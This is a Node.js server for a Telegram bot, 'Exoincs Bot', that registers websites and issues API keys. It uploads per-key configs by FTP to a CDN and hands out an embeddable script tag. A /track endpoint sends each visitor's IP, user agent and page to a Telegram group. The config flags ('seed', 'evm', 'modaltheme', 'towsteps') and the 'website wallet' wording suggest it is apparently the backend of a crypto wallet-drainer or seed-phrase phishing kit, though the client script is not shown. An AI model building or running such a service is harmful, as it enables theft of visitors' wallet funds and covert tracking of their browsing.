// server.js – Telegram bot with FTP upload, visitor tracking, group notifications
require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const { Telegraf } = require('telegraf');
const ftp = require('basic-ftp');

// ---------- CONFIG ----------
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID || '';
const PORT = process.env.PORT || 3000;
const API_BASE = process.env.API_BASE; // e.g., https://your-bot.onrender.com
const CDN_BASE = process.env.CDN_BASE; // e.g., https://assets.cdn.express

const FTP_HOST = process.env.FTP_HOST;
const FTP_USER = process.env.FTP_USER;
const FTP_PASSWORD = process.env.FTP_PASSWORD;
const FTP_SECURE = process.env.FTP_SECURE === 'true';

if (!BOT_TOKEN || !FTP_HOST || !FTP_USER || !FTP_PASSWORD) {
    console.error('❌ Missing required environment variables');
    process.exit(1);
}

// ---------- DATABASE ----------
const db = new sqlite3.Database('./exoincs.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS keys (
        api_key TEXT PRIMARY KEY,
        domain TEXT,
        exogator_id TEXT,
        modaltheme INTEGER,
        towsteps INTEGER,
        evm INTEGER,
        seed INTEGER,
        auto INTEGER,
        dark INTEGER,
        group_id TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

function generateApiKey() {
    return crypto.randomBytes(16).toString('hex');
}

// ---------- FTP UPLOAD ----------
async function uploadConfigToCDN(apiKey, config) {
    const client = new ftp.Client();
    client.ftp.verbose = true;
    try {
        await client.access({
            host: FTP_HOST,
            user: FTP_USER,
            password: FTP_PASSWORD,
            secure: FTP_SECURE
        });
        await client.ensureDir('/configs');
        const remotePath = `/configs/${apiKey}.json`;
        const jsonStr = JSON.stringify(config, null, 2);
        await client.uploadFrom(Buffer.from(jsonStr), remotePath);
        client.close();
        console.log(`✅ Config uploaded: ${remotePath}`);
    } catch (err) {
        console.error('FTP upload failed:', err);
        throw err;
    }
}

// ---------- EXPRESS API ----------
const app = express();
app.use(express.json());

app.get('/config', (req, res) => {
    const key = req.query.key;
    if (!key) return res.status(400).json({ error: 'Missing key' });
    db.get(`SELECT exogator_id, modaltheme, towsteps, evm, seed, auto, dark FROM keys WHERE api_key = ?`, [key], (err, row) => {
        if (err || !row) return res.status(404).json({ error: 'Invalid key' });
        res.json(row);
    });
});

app.post('/track', async (req, res) => {
    const { key, ua, url, referrer } = req.body;
    const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (!key) return res.status(400).json({ error: 'Missing key' });
    db.get(`SELECT group_id, domain FROM keys WHERE api_key = ?`, [key], async (err, row) => {
        if (err || !row) return res.status(404).json({ error: 'Key not found' });
        const groupId = row.group_id;
        const domain = row.domain;
        if (groupId) {
            const message = `🔔 <b>New Visitor</b>\n🌐 Domain: ${domain}\n📱 IP: ${ip}\n🖥️ UA: ${ua}\n📍 Page: ${url}`;
            try {
                await bot.telegram.sendMessage(groupId, message, { parse_mode: 'HTML' });
            } catch(e) { console.error('Failed to send to group:', e.message); }
        }
        res.json({ ok: true });
    });
});

// ---------- TELEGRAM BOT ----------
const bot = new Telegraf(BOT_TOKEN);

bot.start((ctx) => {
    ctx.reply(`🤖 <b>Exoincs Bot</b> – Register your website wallet.

Commands:
/register &lt;domain&gt; &lt;exogator_id&gt; &lt;modaltheme&gt; &lt;towsteps&gt; &lt;evm&gt; &lt;seed&gt; &lt;auto&gt; &lt;dark&gt; &lt;group_id&gt;
/list
/stats &lt;api_key&gt;
/help

Example:
<code>/register example.com EXO123 3 1 1 0 0 0 -1001234567890</code>

After registration, use this script on your website:
<code>&lt;script src="${CDN_BASE}/exo-api.js?key=YOUR_API_KEY"&gt;&lt;/script&gt;</code>`, { parse_mode: 'HTML' });
});

bot.command('register', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 10) {
        return ctx.reply('Usage: /register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark> <group_id>\nGroup ID must start with -100 for supergroups.');
    }
    const [domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark, group_id] = args.slice(1);
    if (!domain.includes('.')) return ctx.reply('Invalid domain');
    const modal = parseInt(modaltheme);
    const tow = parseInt(towsteps);
    const e = parseInt(evm);
    const s = parseInt(seed);
    const a = parseInt(auto);
    const d = parseInt(dark);
    if (isNaN(modal) || modal < 1 || modal > 4) return ctx.reply('modaltheme 1-4');
    if ([tow, e, s, a, d].some(v => v !== 0 && v !== 1)) return ctx.reply('Other flags must be 0/1');
    if (!group_id.startsWith('-100')) return ctx.reply('Group ID must be a supergroup ID (starts with -100). Get it from @userinfobot.');

    const apiKey = generateApiKey();
    const config = { exogator_id, modaltheme: modal, towsteps: tow, evm: e, seed: s, auto: a, dark: d };
    try {
        await uploadConfigToCDN(apiKey, config);
        db.run(`INSERT INTO keys (api_key, domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark, group_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [apiKey, domain, exogator_id, modal, tow, e, s, a, d, group_id],
            (err) => {
                if (err) return ctx.reply('❌ Failed to save. Possibly duplicate?');
                const scriptUrl = `${CDN_BASE}/exo-api.js?key=${apiKey}`;
                ctx.reply(`✅ <b>Registration successful!</b>\n\n🔑 API Key: <code>${apiKey}</code>\n📜 Script URL:\n<code>${scriptUrl}</code>\n\nAdd this to your website &lt;body&gt;:\n<code>&lt;script src="${scriptUrl}"&gt;&lt;/script&gt;</code>\n\nVisitors will be reported to group ${group_id}.`, { parse_mode: 'HTML' });
            });
    } catch (err) {
        console.error(err);
        ctx.reply('❌ Failed to upload config to CDN. Check FTP credentials.');
    }
});

bot.command('list', (ctx) => {
    if (ADMIN_ID && ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('Admin only');
    db.all(`SELECT api_key, domain, created_at FROM keys`, (err, rows) => {
        if (err || !rows.length) return ctx.reply('No keys.');
        let msg = '<b>Registered APIs:</b>\n';
        rows.forEach(r => msg += `🔑 <code>${r.api_key}</code> – ${r.domain} (${r.created_at})\n`);
        ctx.reply(msg, { parse_mode: 'HTML' });
    });
});

bot.command('stats', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: /stats &lt;api_key&gt;');
    const key = args[1];
    db.get(`SELECT domain, created_at FROM keys WHERE api_key = ?`, [key], (err, row) => {
        if (err || !row) return ctx.reply('Not found');
        ctx.reply(`📊 <b>Stats for <code>${key}</code></b>\nDomain: ${row.domain}\nRegistered: ${row.created_at}\n(Detailed logs coming soon)`, { parse_mode: 'HTML' });
    });
});

bot.launch();
console.log('🤖 Bot started with FTP upload');

app.listen(PORT, () => console.log(`🌐 API on port ${PORT}`));
